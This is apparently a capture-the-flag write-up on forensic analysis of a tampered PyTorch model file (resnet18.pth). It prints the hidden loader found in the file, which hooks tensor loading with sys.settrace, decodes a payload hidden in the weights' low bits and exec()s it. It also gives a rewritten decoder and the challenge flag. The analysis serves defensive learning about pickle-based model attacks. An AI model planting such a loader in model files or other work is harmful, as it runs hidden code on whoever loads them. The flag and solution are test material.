# Cyber Apocalypse CTF 2025: Tales from Eldoria

## Crystal Corruption
> In the Library of Loria, an ancient crystal (resnet18.pth) containing a magical machine learning model was activated. Unknown to the mage who awakened it, the artifact had been tampered with by Malakar’s followers, embedding malicious enchantments. As Eldoria’s forensic mage, analyze the corrupted model file, uncover its hidden payload, and extract the flag to dispel the dark magic.


- **Category**: ML 
- **Difficulty**: Medium
- **Author**: Alexct549

## Writeup

More stego please 🙏🏼🙏🏼🙏🏼

We first check for hidden code

```python
with open('resnet18.pth', 'rb') as f:
    content = f.read()

print(content[:2000])
```

Good we found it here it is

```python
import sys
import torch
def stego_decode(tensor, n=3):    
    import struct    
    import hashlib
    import numpy    
    bits = numpy.unpackbits(tensor.view(dtype=numpy.uint8))    
    payload = numpy.packbits(numpy.concatenate([numpy.vstack(tuple([bits[i::tensor.dtype.itemsize * 8] for i in range(8-n, 8)])).ravel("F")])).tobytes()
    (size, checksum) = struct.unpack("i 64s", payload[:68])    
    message = payload[68:68+size]    
    return message
def call_and_return_tracer(frame, event, arg):
    global return_tracer
    global stego_decode
def return_tracer(frame, event, arg):
    if torch.is_tensor(arg):
        payload = stego_decode(arg.data.numpy(), n=3)
    if payload is not None:
        sys.settrace(None)               
        exec(payload.decode("utf-8"))    
    if event == "call" and frame.f_code.co_name == "_rebuild_tensor_v2":
        frame.f_trace_lines = False
        return return_tracer
sys.settrace(call_and_return_tracer)
```

And its a stego decode function let's rework it a little and it should work

```python
import torch
import numpy as np
import torchvision.models as models

def stego_decode(tensor, n=3):    
    import struct
    bits = np.unpackbits(tensor.view(dtype=np.uint8))    
    payload = np.packbits(np.concatenate([np.vstack(tuple([bits[i::tensor.dtype.itemsize * 8] for i in range(8-n, 8)])).ravel("F")])).tobytes()
    (size, checksum) = struct.unpack("i 64s", payload[:68])    
    message = payload[68:68+size]    
    return message

def extract_payload_from_model(model):
    for name, param in model.named_parameters():
        try:
            payload = stego_decode(param.data.numpy(), n=3)
            if payload:
                print(f"Payload found in tensor: {name}")
                print(f"Decoded payload: {payload.decode('utf-8')}")
                return payload.decode('utf-8')
        except Exception as e:
            pass
    return None

model = models.resnet18(pretrained=False)
state_dict = torch.load('resnet18.pth',weights_only=False, map_location='cpu')
model.load_state_dict(state_dict)

payload = extract_payload_from_model(model)
if payload:
    print("Successfully extracted payload:", payload)
else:
    print("No payload found in the model.")
```

PICKLES 🥒🥒🥒
> HTB{n3v3r_tru5t_p1ckl3_m0d3ls}
